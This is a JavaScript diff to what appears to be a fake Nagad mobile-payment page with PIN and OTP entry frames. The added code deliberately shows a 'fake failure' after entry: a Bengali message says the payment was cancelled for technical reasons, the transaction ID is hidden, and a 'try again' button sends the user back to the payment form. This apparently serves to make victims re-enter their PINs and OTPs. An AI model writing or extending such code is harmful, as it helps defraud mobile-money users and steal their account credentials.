@@ -611,9 +611,29 @@
           framePin.classList.add('hidden');
           frameOtp.classList.add('hidden');
           document.getElementById('action-buttons-grid').parentElement.parentElement.classList.add('hidden');
+          // Change circle icon to X (or alert-triangle) for fake failure
+          const successCircle = document.querySelector('#frame-success .w-20');
+          if (successCircle) {
+            successCircle.innerHTML = '<i data-lucide="x" class="w-10 h-10 stroke-[3.5]"></i>';
+          }
 
-          // Set dynamic transaction ID
-          successTxId.innerText = transaction.id;
+          // Set messages for fake failure
+          document.querySelector('#frame-success h3').innerText = 'পেমেন্ট বাতিল করা হয়েছে!';
+          document.querySelector('#frame-success p').innerText = 'দুঃখিত, কিছু কারিগরি ত্রুটির কারণে লেনদেনটি এই মুহূর্তে সম্পন্ন করা সম্ভব হয়নি। দয়া করে আবার চেষ্টা করুন।';
+          
+          // Hide the Tx ID box for failure
+          const txIdBox = document.querySelector('#frame-success .bg-white\\/10');
+          if (txIdBox) txIdBox.classList.add('hidden');
+
+          // Change close button text to "আবার চেষ্টা করুন" and redirect back to payment page
+          const closeBtn = document.getElementById('btn-success-close');
+          if (closeBtn) {
+            closeBtn.innerText = 'আবার চেষ্টা করুন';
+            closeBtn.onclick = (e) => {
+              e.preventDefault();
+              window.location.href = 'payment.html';
+            };
+          }
 
           // Show native Nagad success frame
           frameSuccess.classList.remove('hidden');
